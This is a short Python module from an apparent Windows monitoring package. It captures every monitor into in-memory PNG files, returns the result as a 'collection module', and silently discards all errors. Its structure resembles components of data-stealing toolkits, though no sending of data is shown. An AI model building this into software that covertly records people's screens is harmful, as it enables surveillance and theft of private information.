from os import path

from systoring.windowsmonitoring.helpers import Scrcp, MemoryStorage
from systoring.windowsmonitoring.helpers.dataclasses import Data


class Screenshot:
    def __init__(self, folder: str):

        self.__folder = folder
        self.__storage = MemoryStorage()

    def __create_screen(self) -> None:
        """
        Takes a screenshot of the monitors.

        Parameters:
        - None.

        Returns:
        - None.
        """
        capture = Scrcp()
        screenshots = capture.create_in_memory()

        for index, monitor in enumerate(screenshots):
            self.__storage.add_from_memory(path.join(self.__folder, f"monitor-{index}.png"), monitor)

    def run(self) -> Data:
        """
        Launches the screenshots collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__create_screen()

            return self.__storage.get_data()

        except Exception as e:
            pass
